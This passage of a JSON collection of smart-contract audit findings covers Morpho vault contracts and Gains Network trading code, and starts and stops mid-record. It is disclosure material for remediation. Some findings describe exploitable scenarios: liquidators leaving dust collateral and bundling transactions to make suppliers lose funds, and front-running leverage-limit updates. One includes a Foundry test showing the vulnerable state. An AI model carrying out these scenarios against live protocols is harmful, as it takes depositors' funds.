      "title": "LEGACY_MORPHO and NEW_MORPHO could be dened as IERC20 ",
      "impact": "LOW",
      "content": "## Context\n- **Wrapper.sol#L15**\n- **Wrapper.sol#L20**\n\n## Description\nCurrently, the `LEGACY_MORPHO` and `NEW_MORPHO` are defined as address and then when they are used, a wrap to `IERC20` interface is performed:\n\n```solidity\nIERC20(LEGACY_MORPHO).transferFrom(msg.sender, address(this), value);\n```\n\n## Recommendation\nConsider defining them as `IERC20` by default to avoid the extra wrapping in `IERC20`.\n\n## Morpho\nAcknowledged. We prefer to stay with the current version.\n\n## Cantina Managed\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46601",
      "title": "Misleading comments related with ERC20Wrapper and ERC20WrapperBundler inside the Wrap- per ",
      "impact": "LOW",
      "content": "## Code Review Summary\n\n## Context\n- `Wrapper.sol#L41`\n- `Wrapper.sol#L51`\n- `Wrapper.sol#L62`\n\n## Description\nThroughout the Wrapper contract, there are two instances where the comments are misleading:\n\n1. The Wrapper contains two functions, `withdrawTo` and `depositFor`, which are compliant with the `ERC20Wrapper`. However, the contract itself is not fully compliant; only these two functions are. Therefore, the comments on lines 41 and 51 should be more specific:\n   ```solidity\n   /// @dev Compliant to `ERC20Wrapper.depositTo` function from OZ for convenience.\n   /// ...\n   /// @dev Compliant to `ERC20Wrapper.withdrawTo` function from OZ for convenience.\n   ```\n\n2. On line 62, to ease wrapping via the bundler contract, it states that the Wrapper is supposed to be used with the `ERC20WrapperBundler` for wrapping. One might think that it can also be used for unwrapping due to the presence of the `withdrawTo` function. This is not true because the `erc20WrapperWithdrawTo` function in the Bundler requires additional modifications: \n   - `balanceOf` should be implemented in the Wrapper.\n   - `approval` should be implemented in the `ERC20WrapperBundler.erc20WrapperWithdrawTo`.\n   \n   Consider adding extra context on the `withdrawTo` function, specifying that it is not compatible with the `ERC20WrapperBundler.erc20WrapperWithdrawTo`.\n\n## Recommendation\nConsider adding the extra context mentioned above in the comments.\n\n## Morpho: Acknowledged\n1. The contract is not expected to be fully compliant with `ERC20Wrapper`.\n2. It is mentioned in `Wrapper.sol#L61` that the bundler is expected to ease the wrapping process, but nothing is said about unwrapping.\n\n## Cantina Managed: Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46600",
      "title": "Missing function to get the current implementation ",
      "impact": "LOW",
      "content": "## Review Summary\n\n## Context\nNo context files were provided by the reviewer.\n\n## Description\nThe DelegationToken is using UUPSUpgradable proxy which utilizes ERC1967 as proxy storage slots. Currently, there is no way to retrieve the current implementation of the proxy.\n\n## Recommendation\nTo obtain the current implementation of a proxy, the ERC1967Utils library offers a function called `ERC1967Utils.getImplementation()`. Consider wrapping this in a public function:\n\n```solidity\nfunction getImplementation() external view returns (address) {\n    return ERC1967Utils.getImplementation();\n}\n```\n\n## Morphos\nFixed here in PR 76.\n\n## Cantina Managed\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46599",
      "title": "A prex can be added to the namespaced storage layout 's id ",
      "impact": "LOW",
      "content": "## Delegation Token Storage Recommendation\n\n**Context**: DelegationToken.sol#L32-L34\n\n**Description**: To better isolate and avoid possible future name collisions between different projects, it might make sense to add a prefix to the namespaced storage layout's ID (as specified in EIP 7201). Currently, it is only DelegationToken.\n\n**Recommendation**: It might make sense to change it to something like `morpho.storage.DelegationToken`:\n\n```solidity\n// keccak256(abi.encode(uint256(keccak256(\"morpho.storage.DelegationToken\")) - 1)) & ~bytes32(uint256(0xff))\nbytes32 internal constant DelegationTokenStorageLocation = ...;\n```\n\n### STORAGE LAYOUT\n/// @custom:storage-location erc7201:morpho.storage.DelegationToken\n\n**Morpho**: Fixed in PR 75.  \n**Cantina Managed**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_october2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "m4rio",
        "Saw-mon and Natalie"
      ]
    },
    {
      "id": "46713",
      "title": "Missing new owner powers in documentation ",
      "impact": "LOW",
      "content": "## Context\nREADME.md#L41\n\n## Description\nThe project's README lists all powers of vault owners. However, its missing the new powers to set the vault's name and symbol granted by the `setName` and `setSymbol` functions.\n\n## Recommendation\nConsider including them to better specify the expected powers of vault owners.\n\n## Morpho Labs\nFixed in PR 43.\n\n## Cantrina Managed\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "46712",
      "title": "Inconsistent use of msg.sender ",
      "impact": "LOW",
      "content": "## Context\n**File:** MetaMorpho.sol#L781\n\n## Description\nThe MetaMorpho contract uses the inherited `_msgSender()` function whenever it needs to read the `msg.sender` value. The only place this doesnt happen is in the `_setCap` function, when emitting the `SetWithdrawQueue` event.\n\n## Recommendation\nFor consistency across the contract and to avoid confusions, consider changing this occurrence to `_msgSender()`.\n\n## Morpho Labs\nAcknowledged. We decided to not fix this issue, to minimize the code diff with the normal MetaMorpho.\n\n## Cantina Managed\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "46711",
      "title": "Incomplete documentation of totalAssets behavior ",
      "impact": "LOW",
      "content": "## MetaMorpho Contract Review\n\n## Context\n- **File:** MetaMorpho.sol\n- **Line:** L611\n\n## Description\nThe reviewed version of the MetaMorpho contract introduces a notable change in the way the ERC4626's function `totalAssets` behaves. While the EIP specifies that `totalAssets` represents the \"total amount of the underlying asset that is managed by the vault,\" that might not always be the case in the new MetaMorpho vault.\n\nThe `totalAssets` function has been re-designed to maintain a non-decreasing value, even in scenarios where the vault experiences asset losses due to bad debt in Morpho markets or forced market removals. Consequently, the value returned by `totalAssets` may not always accurately reflect the current amount of assets under management by the vault. Instead, it may overestimate the amount.\n\n## Recommendation\nConsider improving the documentation of `totalAssets` in the function's docstrings to clearly specify this behavior and avoid errors in contracts and off-chain clients querying it.\n\n## Morpho Labs\n- **Status:** Fixed in PR 44.\n\n## Cantina Managed\n- **Status:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "46710",
      "title": "Confusing use of uint184 and uint196 types for pending values ",
      "impact": "LOW",
      "content": "## PendingLib Review\n\n## Context\n`PendingLib.sol#L34`\n\n## Description\nThe MetaMorpho contract uses the PendingLib library to update pending values of guardians, supply caps, and timelocks. The supply caps and pending timelock values, respectively stored in the `pendingCap` and `pendingTimelock` state variables, are updated using the `PendingLib::update(PendingUint192 storage pending, uint184 newValue, uint256 timelock)` function. \n\nThese two state variables use the `PendingUint192` struct, which internally stores the pending value to set as a `uint192` number. However, the second parameter of the mentioned update function is a `uint184`, which is implicitly cast to a `uint192` when written to the `value` field of the `PendingUint192` struct.\n\nWhile supply caps of markets are expected to be of `uint184` type, their pending values are stored as `uint192` values, but capped to `uint184` when calling the update function. Pending timelock values are expected to be `uint192`, but they're always cast to `uint184` when calling the update function, only to then be stored as `uint192` as well.\n\nWhile this does not currently pose a security risk, the inconsistent use of these types seems error-prone and could lead to unexpected casting errors in the future.\n\n## Recommendation\nConsider either updating the code to consistently cast and store pending values in the expected types, or better documenting the reasoning behind the current implementation to avoid future mistakes.\n\n## Morpho Labs\nAcknowledged. Indeed, the pending values should be `uint184`, although we decided not to change this to keep the code diff with the normal MetaMorpho small.\n\n## Cantina Managed\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "46709",
      "title": "Spec mismatch for ERC20Permit string name ",
      "impact": "LOW",
      "content": "## Context\n**MetaMorpho.sol#L136**\n\n## Description\nThe `name` is used in ERC4626, ERC20, and ERC20Permit, out of which its function override solves for ERC4626 and ERC20. However, in the EIP712 contract, the name is immutable. \n\nFrom the EIP712 specification:\n> `string name` - the user-readable name of the signing domain, i.e., the name of the DApp or the protocol. \n\nIt should be human-readable since thats the only human-readable field to assist the user.\n\n## Recommendation\nConsider changing the name to a human-readable string in the EIP712 contract.\n\n## Morpho Labs\nFixed in PR 42.\n\n## Cantina Managed\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "46708",
      "title": "Liquidators can make suppliers inadvertently deposit assets to unhealthy MetaMorpho vaults ",
      "impact": "MEDIUM",
      "content": "## Context\n(No context files were provided by the reviewer)\n\n## Description\nThe reviewed version of the MetaMorpho contract introduces the `lostAssets` state variable, which according to its documentation \"stores the missing assets due to realized bad debt or forced market removal\". This is due to the fact that in this kind of vault, by design, `totalAssets` won't be decreased to account for missing assets. \n\nSo in principle, when there's bad debt realized in a Morpho market, the MetaMorpho vault must increase the `lostAssets` amount accordingly, to account for any missing assets. For this vault, anyone that is assessing its health and risk exposure is expected to not only pay attention to the total assets managed by the vault (as returned by `totalAssets`), but also to the actual hole in the vault, given by `lostAssets`.\n\nHowever, it must be noted that `lostAssets` only starts accounting for missing assets when bad debt is realized in Morpho. This happens in circumstances when a liquidation leaves a position with strictly zero collateral and positive debt. But it's possible for liquidators to leave dust collateral after the liquidation, and avoid realizing bad debt (see [Morpho.sol#L392-L403](#)). This behavior in Morpho was noted and discussed in a previous Cantina review (see issue 3.5.5 - There might not be enough incentives for liquidators to realize bad debt).\n\nIn such circumstances, the `lostAssets` value doesn't increase in the MetaMorpho vault. It stays at zero, even if practically there's no collateral left after the liquidation (only dust). This can be seen in the following test case:\n\n```solidity\nfunction testLostAssetsAfterAlmostTotalLiquidation(uint256 borrowed, uint256 collateral, uint256 deposit) public {\n    borrowed = bound(borrowed, MIN_TEST_ASSETS, MAX_TEST_ASSETS);\n    collateral = bound(collateral, borrowed.mulDivUp(1e18, allMarkets[0].lltv), type(uint128).max);\n    deposit = bound(deposit, borrowed, MAX_TEST_ASSETS);\n    collateralToken.setBalance(BORROWER, collateral);\n    loanToken.setBalance(SUPPLIER, deposit);\n\n    // Supplier deposits loanToken using MetaMorpho vault\n    vm.prank(SUPPLIER);\n    vault.deposit(deposit, SUPPLIER);\n    \n    // Borrower deposits some collateral and borrows loanTokens\n    vm.startPrank(BORROWER);\n    morpho.supplyCollateral(allMarkets[0], collateral, BORROWER, hex\"\");\n    morpho.borrow(allMarkets[0], borrowed, 0, BORROWER, BORROWER);\n    vm.stopPrank();\n\n    uint256 initialTotalAssets = vault.totalAssets();\n\n    // Price drops\n    oracle.setPrice(0);\n    \n    // Liquidator takes almost all collateral, leaving 1 unit\n    vm.prank(LIQUIDATOR);\n    morpho.liquidate(allMarkets[0], BORROWER, collateral - 1, 0, hex\"\");\n    \n    // One unit of collateral remaining => no bad debt accounted for yet in Morpho\n    assertEq(collateralToken.balanceOf(address(morpho)), 1);\n    \n    vault.deposit(0, SUPPLIER); // trigger update lostAssets on vault just in case\n    \n    // As expected total assets hasn't changed\n    assertEq(vault.totalAssets(), initialTotalAssets);\n    \n    // But the MetaMorpho vault hasn't registered any lost assets either\n    assertEq(vault.lostAssets(), 0);\n}\n```\n\nWhile this could be considered the expected behavior of `lostAssets`, it must be highlighted that it introduces a potentially risky scenario for suppliers of MetaMorpho vaults. Because if `totalAssets` cannot be fully relied on to know the actual assets managed by the vault, and `lostAssets` cannot be fully relied on to know the actual assets lost, then it becomes harder to assess the risk of this kind of MetaMorpho vaults. Liquidators now have even more incentives to not realize bad debt in Morpho markets and just leave dust units of collateral, because they can use this to attack vault's suppliers. \n\nLet's imagine a scenario where there's a Morpho market that is on the brink of realizing bad debt if a position is liquidated, and a MetaMorpho vault that integrates this market. Suppliers know that they should inspect the `lostAssets` state variable to better assess risks, so the more cautious could supply with sensible protections, using an on-chain contract that checks `lostAssets` before actually joining the vault:\n\n```solidity\ncontract Supplier {\n    function supply(/*...*/) {\n        if(vault.lostAssets() == 0) {\n            // Supply logic\n        } else {\n            revert(/*...*/);\n        }\n    }\n}\n```\n\nBut this protection can be easily bypassed by malicious liquidators. Because, as explained, it's possible to have the vault lose assets without actually increasing `lostAssets`. A liquidator can wait for one or many suppliers to submit transactions that supply assets to the vault (which, before being liquidated, might look healthy enough), and create a bundle of transactions where the liquidator:\n\n1. Acquires shares of the MetaMorpho vault.\n2. Liquidates the position in the Morpho contract, without realizing bad debt (that is, making the vault lose assets but leaving some dust collateral).\n3. Inserts users' transactions that supply assets to the vault (where any call to `vault.lostAssets()` will return 0).\n4. Redeems the shares acquired in (1) to withdraw the assets supplied by users in (3).\n\nThis can leave suppliers with shares in a vault that won't allow them to withdraw, because the liquidator has taken their assets in (4), even if the suppliers implemented protections to not supply to unhealthy markets.\n\n## Recommendation\nIf the described behavior of `lostAssets` is expected, the Morpho team should consider improving the related documentation and test cases to better specify it. Moreover, they should provide clear guidelines for vault suppliers on how to evaluate risks of this new type of vaults, including any guidelines and possible protections to help mitigate the described risks of malicious liquidators bundling supply transactions to make suppliers lose assets.\n\n## Morpho Labs\nInteresting issue. First, it's important to note that this situation is a pure griefing attack, meaning you don't get anything out of it, except that you harmed the new depositor. Second, the issue is a bit more tricky than what's written. Indeed, when there is a bad debt that's about to be realized on a market, that the vault has V assets, supplying x just before the bad debt realization won't ever make you lose more than V. Which means that the scenario described is impossible; the depositor could always instantly withdraw. Although other depositors might start a bank run, and the new depositor could get stuck as described. \n\nAlso, there is a similar issue in the \"normal\" MetaMorpho, where you could enter a vault thinking everything was fine but there was pending bad debt, and it gets realized just after you enter the vault. This has not been documented because we considered it too edge case (depositors being liquidators, etc.). In the end, we think that there is no need to put a comment for this edge case.\n\n## Cantina Managed\nAcknowledged.",
      "summary": "\nThis bug report discusses an issue with the MetaMorpho contract, specifically with the introduction of the lostAssets state variable. This variable is meant to keep track of missing assets due to bad debt or forced market removal, but it only starts accounting for missing assets when bad debt is realized in a Morpho market. This means that in certain circumstances, the lostAssets value does not increase even when there is practically no collateral left after a liquidation. This can lead to a potentially risky scenario for suppliers of MetaMorpho vaults, as it becomes harder to assess the risk of these types of vaults. The report recommends that the Morpho team improve documentation and provide clear guidelines for suppliers to evaluate risks and mitigate the potential risks of malicious liquidators. However, the issue is considered to be an edge case and may not be addressed. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "46707",
      "title": "Unfair pricing of metamorpho share when it is used as collateral in morpho market ",
      "impact": "MEDIUM",
      "content": "## MetaMorpho Vault Pricing Issue\n\n## Context\n(No context files were provided by the reviewer)\n\n## Description\nMetaMorpho uses `MorphoChainlinkOracleV2.sol` for fair pricing of the vault's share. However, in the case of a vault that supports **lostAssets** (i.e., no share price decrease feature), if `lostAssets > 0` and bad debt is not repaid externally, the oracle would give the inflated price. \n\nAs per discussion with the morpho team in this comment:\n\n> For a vault with 50% of bad debt, it is highly more likely that it will experience bad debt, sooner or later. When it will happen, users will not be able to get anything out of their shares. Is it sound to price shares at $0.5? Not sure. But in this case, lenders lending against these shares already lost, so it's not even very useful to care about the price.\n\nIt is still important that shares are priced closest to the actual redeemable price since that would allow borrowers to be liquidated and lenders a fair chance to participate in a bank-run for the remaining 50%. Morpho Labs believes that it's not a good idea to lend against a vault that has significant lost assets, so pricing the vault in such situations should not be cared about.\n\nThough it is true that lending will pause against such a vault when off-chain consensus is reached that the debt hole is large enough, the majority of the impact is from capital already at stake and not then newly anticipated incoming assets.\n\n## Recommendation\nThe current oracle should be modified for vaults supporting **lostAssets** to:\n\n- Assess the risk off-chain for bad debt and adjust the share price by some tolerance threshold. Since the price is only used for computing borrowable and liquidation, once bad debt has started accruing, the effective price can be aggressively reduced, and after a certain point, it can be a step function switching it to 0.\n- Have circuit breakers in place to revert in the `price()` function temporarily until a fair price is assessed off-chain and put on-chain. This will also revert liquidations and borrows temporarily.\n\n## Acknowledgments\n**Morpho Labs:** Acknowledged. We are aware of this issue, as mentioned, and we don't think that it requires any change in the code.  \n**Cantina Managed:** Acknowledged.",
      "summary": "\nThe report discusses an issue with the MetaMorpho software where the pricing of a vault's share is not accurate in certain situations. This is due to the use of the MorphoChainlinkOracleV2.sol feature, which does not properly account for lost assets in the vault. The developers suggest modifying the oracle to adjust the share price based on offchain risk assessment and implementing circuit breakers to temporarily halt certain functions. The developers are aware of the issue but do not believe it requires any changes to the code. Cantina Managed has acknowledged the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "Morpho",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_morpho_september2024.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Om Parikh",
        "0xdeadbeef",
        "tnch"
      ]
    },
    {
      "id": "36432",
      "title": "[L-04] `__placeholder` is not set to 0 inside the Trade data",
      "impact": "LOW",
      "content": "When a trade is opened, users need to provide `Trade` data that will be stored. Inside the `Trade` struct data, there is a `__placeholder` reserved for future usage. However, open trade operations currently allow users to provide arbitrary values to `__placeholder`. If in the future this field will be used, malicious users can input values to `__placeholder` before an upgrade is executed, avoiding input validation and potentially causing issues. Consider setting `_trade.__placeholder` to 0 inside the `_openTrade` operation.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36431",
      "title": "[L-03] Bypassing max and min leverage limits",
      "impact": "LOW",
      "content": "When a request is made to increase position size, the new leverage is checked to ensure it is within the minimum and maximum leverage limits.\n\n```solidity\n    function validateRequest(\n        ITradingStorage.Trade memory _trade,\n        IUpdatePositionSizeUtils.IncreasePositionSizeInput memory _input\n    ) internal view returns (uint256 positionSizeCollateralDelta) {\n        ...\n\n        // 2. Revert if new leverage is below min leverage or above max leverage\n        bool isLeverageUpdate = _input.collateralDelta == 0;\n        {\n            uint24 leverageToValidate = isLeverageUpdate\n                ? _trade.leverage + _input.leverageDelta\n                : _input.leverageDelta;\n            if (\n                leverageToValidate > _getMultiCollatDiamond().pairMaxLeverage(_trade.pairIndex) * 1e3 || // @audit only check in validateReqquest, not when validateCallback\n                leverageToValidate < _getMultiCollatDiamond().pairMinLeverage(_trade.pairIndex) * 1e3\n            ) revert ITradingInteractionsUtils.WrongLeverage();\n        }\n        ...\n    }\n```\n\nHowever, during the callback validation, the new leverage is assumed to be within the min and max limits and is not rechecked. This means the leverage limits can be bypassed if the leverage limits are updated between the request and the callback. Users can potentially exploit this by making a request to increase position size with leverage that is out of the limit just before an update in the system leverage limits by front-runnning the update transaction.\n\n```solidity\n    function validateCallback(\n        ITradingStorage.Trade memory _existingTrade,\n        IUpdatePositionSizeUtils.IncreasePositionSizeValues memory _values,\n        ITradingCallbacks.AggregatorAnswer memory _answer,\n        uint256 _expectedPrice,\n        uint256 _maxSlippageP\n    ) internal view returns (ITradingCallbacks.CancelReason cancelReason) {\n        uint256 maxSlippage = (uint256(_expectedPrice) * _maxSlippageP) / 100 / 1e3;\n\n        cancelReason = (\n            _existingTrade.long\n                ? _values.priceAfterImpact > _expectedPrice + maxSlippage\n                : _values.priceAfterImpact < _expectedPrice - maxSlippage\n        )\n            ? ITradingCallbacks.CancelReason.SLIPPAGE // 1. Check price after impact is within slippage limits\n            : _existingTrade.tp > 0 &&\n                (_existingTrade.long ? _answer.price >= _existingTrade.tp : _answer.price <= _existingTrade.tp)\n            ? ITradingCallbacks.CancelReason.TP_REACHED // 2. Check TP has not been reached\n            : _existingTrade.sl > 0 &&\n                (_existingTrade.long ? _answer.price <= _existingTrade.sl : _answer.price >= _existingTrade.sl)\n            ? ITradingCallbacks.CancelReason.SL_REACHED // 3. Check SL has not been reached\n            : (\n                _existingTrade.long\n                    ? (_answer.price <= _values.existingLiqPrice || _answer.price <= _values.newLiqPrice)\n                    : (_answer.price >= _values.existingLiqPrice || _answer.price >= _values.newLiqPrice)\n            )\n            ? ITradingCallbacks.CancelReason.LIQ_REACHED // 4. Check current and new LIQ price not reached\n            : !TradingCommonUtils.isWithinExposureLimits(\n                _existingTrade.collateralIndex,\n                _existingTrade.pairIndex,\n                _existingTrade.long,\n                _values.newCollateralAmount,\n                _values.newLeverage\n            )\n            ? ITradingCallbacks.CancelReason.EXPOSURE_LIMITS // 5. Check trade still within exposure limits\n            : ITradingCallbacks.CancelReason.NONE;  // @audit not check if the leverage is within limit when callback\n    }\n```\n\nValidate the new leverage during the callback to ensure it remains within the min and max leverage limits, even if the limits have been updated between the initial request and the callback.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36430",
      "title": "[L-02] `requestIncreasePositionSize` could fail",
      "impact": "LOW",
      "content": "When users increase their position size, they can set `_input.collateralDelta` to 0 if they only want to increase the leverage.\n\n```solidity\n    function requestIncreasePositionSize(IUpdatePositionSizeUtils.IncreasePositionSizeInput memory _input) external {\n        // 1. Base validation\n        ITradingStorage.Trade memory trade = _baseValidateRequest(_input.user, _input.index);\n\n        // 2. Increase position size validation\n        uint256 positionSizeCollateralDelta = IncreasePositionSizeUtils.validateRequest(trade, _input);\n\n        // 3. Transfer collateral delta from trader to diamond contract (nothing transferred for leverage update)\n        // @audit - if collateral delta 0, should just skip\n>>>     TradingCommonUtils.transferCollateralFrom(trade.collateralIndex, _input.user, _input.collateralDelta);\n\n        // 4. Create pending order and make price aggregator request\n        ITradingStorage.Id memory orderId = _initiateRequest(\n            trade,\n            true,\n            _input.collateralDelta,\n            _input.leverageDelta,\n            positionSizeCollateralDelta,\n            _input.expectedPrice,\n            _input.maxSlippageP\n        );\n\n        emit IUpdatePositionSizeUtils.PositionSizeUpdateInitiated(\n            orderId,\n            trade.user,\n            trade.pairIndex,\n            trade.index,\n            true,\n            _input.collateralDelta,\n            _input.leverageDelta\n        );\n    }\n```\n\nBut if the used collateral token reverts on 0 transfer, the update will always fail.\n\nSkip the transfer if `_input.collateralDelta` is 0.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36429",
      "title": "[L-01] Use `_trade.collateralAmount` directly to prevent precision loss",
      "impact": "LOW",
      "content": "In the `DecreasePositionSizeUtils.validateRequest` function, when calculating the new collateral amount if the leverage is updated, the following formula is used:\n\n        ((TradingCommonUtils.getPositionSizeCollateral(_trade.collateralAmount, _trade.leverage) - positionSizeCollateralDelta) * 1e3) / (_trade.leverage - _input.leverageDelta)\n\nHowever, the result of this formula is effectively `_trade.collateralAmount`, which can be used directly to prevent any precision loss that might occur during the calculation.\n\n```solidity\n    function validateRequest(\n        ITradingStorage.Trade memory _trade,\n        IUpdatePositionSizeUtils.DecreasePositionSizeInput memory _input\n    ) internal view returns (uint256 positionSizeCollateralDelta) {\n        ...\n\n        uint256 newCollateralAmount = isLeverageUpdate\n            ? ((TradingCommonUtils.getPositionSizeCollateral(_trade.collateralAmount, _trade.leverage) -\n                positionSizeCollateralDelta) * 1e3) / (_trade.leverage - _input.leverageDelta) // @audit = trade.collateralAmount\n            : _trade.collateralAmount - _input.collateralDelta;\n        ...\n    }\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36428",
      "title": "[M-06] `addPriceImpactOpenInterest()` fails to scale `expiredOiUsd`",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n**Description**\n\n`addPriceImpactOpenInterest()` will keep track of the expired OI when adding OI so that closing of trade will not reduce more OI than necessary.\n\nHowever, it fails to scale the OI USD value by the current collateral/usd price. As the `tradeInfo.collateralPriceUsd` will be updated with the current collateral/usd price, it will cause the removal of OI to be incorrect as the expired OI is based on the previous collateral/usd price and not the last updated collateral/usd price.\n\n```Solidity\n     function addPriceImpactOpenInterest(address _trader, uint32 _index, bool _isPartial, uint128 _oiDeltaUsd) internal {\n       ...\n\n        if (_isPartial) {\n            uint256 existingOiWindowId = _getWindowId(tradeInfo.lastOiUpdateTs, settings);\n\n            if (_isWindowPotentiallyActive(existingOiWindowId, currentWindowId)) {\n                removePriceImpactOpenInterest(_trader, _index, false, tradePriceImpactInfo.lastOiDeltaUsd);\n\n                openInterestUsdToAdd += uint128(\n                    (tradePriceImpactInfo.lastOiDeltaUsd * currentCollateralPriceUsd) / tradeInfo.collateralPriceUsd\n                );\n            } else {\n                //@audit the added expiredOiUsd should also be scaled with current collateral/usd price\n                tradePriceImpactInfo.expiredOiUsd += tradePriceImpactInfo.lastOiDeltaUsd;\n            }\n        }\n```\n\n**Recommendations**\n\nScale the added `expiredOiUsd` with `(currentCollateralPriceUsd) / tradeInfo.collateralPriceUsd`.",
      "summary": "\nThis bug report discusses an issue with the `addPriceImpactOpenInterest()` function in a smart contract. The function is supposed to keep track of expired open interest (OI) when adding new OI to a trade, but it fails to properly adjust for changes in the collateral price. This can lead to incorrect removal of OI when closing a trade. The report recommends scaling the `expiredOiUsd` variable with the current collateral price to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Gainsnetwork May",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review-May.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "36427",
      "title": "[M-05] `removePriceImpactOpenInterest()` fails to account for expired OI",
      "impact": "MEDIUM",
      "content": "**Severity**\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n**Description**\n\n`removePriceImpactOpenInterest()` will ensure that it does not remove more OI than required by deducting the actual removed OI from `expiredOiUsd` when closing a trade.\n\nHowever, it fails to account for `expiredOiUsd` when removing OI for partial position size reduction. That will cause the reduced OI to be higher than required, causing a lower price impact on subsequent trades.\n\nSuppose the scenario,\n\n- existing position size = 1000 (in the outdated window)\n- active OI for trade = 0 (as it's outdated)\n\nAnd the trader increases position size,\n\n- delta position size = 500\n- new position size = 1000 + 500 = 1500\n- expired OI for trade = 1000 (from existing position)\n- active OI for trade = 500\n\nNow if the trader reduces position size while the latest OI is still active,\n\n- delta position size = -700\n- new position size = 1500 - 700 = 800\n- removed OI for trade = 700 (now this is incorrect as the active OI was only 500)\n- the correct OI to remove should be `min(deltaOiUsd, positionSizeUsd - expiredOiUsd)`\n\n```Solidity\n    function removePriceImpactOpenInterest(\n        address _trader,\n        uint32 _index,\n        bool _isPartial,\n        uint128 _oiDeltaUsd\n    ) internal {\n        ...\n\n        if (notOutdated) {\n            IPriceImpact.PairOi storage pairOi = 